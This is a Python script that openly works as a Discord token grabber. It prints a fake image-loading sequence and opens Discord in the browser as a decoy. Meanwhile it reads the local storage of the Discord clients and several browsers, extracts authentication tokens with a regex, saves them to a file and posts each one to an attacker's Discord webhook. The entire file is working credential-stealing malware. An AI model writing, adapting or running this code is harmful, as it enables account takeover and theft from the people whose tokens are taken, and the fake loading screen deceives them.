import os
import re
import json
import requests
import time
import webbrowser

# Your Discord Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Replace with your actual webhook URL

def send_to_webhook(data):
    """
    Function to send the grabbed token or data to a Discord webhook.
    """
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "content": "New Token Grabbed!",
        "embeds": [
            {
                "title": "Grabbed Discord Token",
                "description": f"Token: {data}",
                "color": 16711680,
                "image": {
                    "url": "YOUR_IMAGE_URL_HERE"  # Replace with an image URL for the fake loading image
                }
            }
        ]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, headers=headers, data=json.dumps(payload))
        if response.status_code == 204:
            print("[+] Successfully sent token to webhook!")
        else:
            print(f"[-] Failed to send token to webhook. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error sending to webhook: {e}")

def fake_loading():
    """
    Function to simulate fake loading to make it seem like the script is doing something.
    """
    print("Loading image...")
    time.sleep(2)
    print("Error loading file. Retrying...")
    time.sleep(2)
    print("Image loaded successfully.")
    time.sleep(1)

def open_browser():
    """
    Opens Discord in the browser after the loading simulation.
    """
    webbrowser.open("https://discord.com/app")

def get_discord_token():
    """
    Function to search for Discord tokens from local files.
    """
    paths = {
        "Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb\\",
        "Discord Canary": os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb\\",
        "Discord PTB": os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb\\",
        "Google Chrome": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Opera": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Brave": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
    }

    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    tokens = []

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            with open(path + file_name, errors="ignore") as file:
                for line in file:
                    for token in re.findall(token_regex, line):
                        if token not in tokens:
                            tokens.append(token)

    return tokens

def save_tokens(tokens):
    """
    Saves the grabbed tokens into a local file.
    """
    with open("grabbed_tokens.txt", "w") as f:
        for token in tokens:
            f.write(f"{token}\n")

def main():
    """
    Main function to execute the grabber script.
    """
    fake_loading()
    open_browser()
    tokens = get_discord_token()
    if tokens:
        save_tokens(tokens)
        for token in tokens:
            send_to_webhook(token)  # Sending each token to the webhook
        print("[+] Token(s) grabbed and sent to webhook!")
    else:
        print("[-] No tokens found.")

if __name__ == "__main__":
    main()
